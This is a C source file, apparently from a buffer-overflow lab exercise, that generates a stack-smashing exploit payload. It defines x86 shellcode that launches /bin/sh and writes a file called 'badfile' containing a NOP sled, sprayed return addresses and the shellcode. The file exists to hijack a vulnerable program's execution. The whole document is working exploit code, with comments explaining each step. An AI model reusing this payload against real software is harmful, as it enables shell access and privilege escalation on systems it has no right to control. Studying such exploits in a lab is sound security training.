/* A program that creates a file containing code for launching shell */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "macros.h"

// Shell code adapted from https://github.com/npapernot/buffer-overflow-attack/blob/master/call_shellcode.c
const char shellcode[] =
    "\x31\xc0" /* Line 1: xorl %eax,%eax */
	"\x50" /* Line 2: pushl %eax */
	"\x68""//sh" /* Line 3: pushl $0x68732f2f */
	"\x68""/bin" /* Line 4: pushl $0x6e69622f */
	"\x89\xe3" /* Line 5: movl %esp,%ebx */
	"\x50" /* Line 6: pushl %eax */
	"\x53" /* Line 7: pushl %ebx */
	"\x89\xe1" /* Line 8: movl %esp,%ecx */
	"\x99" /* Line 9: cdq */
	"\xb0\x0b" /* Line 10: movb $0x0b,%al */
	"\xcd\x80" /* Line 11: int $0x80 */
;

unsigned long get_sp(void)
{
    // Get stack pointer
    // esp is stack pointer
    // eax is return value
    __asm__("movl %esp, %eax");
}

void main(int argc, char **argv)
{
    char buffer[BUFFER_SIZE];
    FILE *badfile;

    // Initialize buffer with 0x90 (NOP instruction), serving as slide for shellcode (if it lands in the middle of the buffer)
    memset(&buffer, 0x90, BUFFER_SIZE);

    char *ptr;
    long *addr_ptr, addr;


    int offset = 200;

    int buffer_size = BUFFER_SIZE;

    int i;

    addr = get_sp() + offset;

    ptr = buffer;
    addr_ptr = (long*)(ptr);

    // Doing this to ensure that when the stack overflows, it points to either the shell code or the NOP slide

    // This is because, when buffer overflows, we overwrite the stack return addr
    // We want it to return to somewhere in the NOP slide or shell code
    for (i = 0; i < 20; i++) {
        *addr_ptr = addr;
        addr_ptr++;
    }

    // Insert the shell code
    for (i = 0; i < strlen(shellcode); i++) 
      buffer[buffer_size - (sizeof(shellcode) + 1) + i] = shellcode[i];

    buffer[buffer_size - 1] = '\0';

    // Save to file
    badfile = fopen("./badfile", "w");

    fwrite(buffer, BUFFER_SIZE, 1, badfile);

    fclose(badfile);
}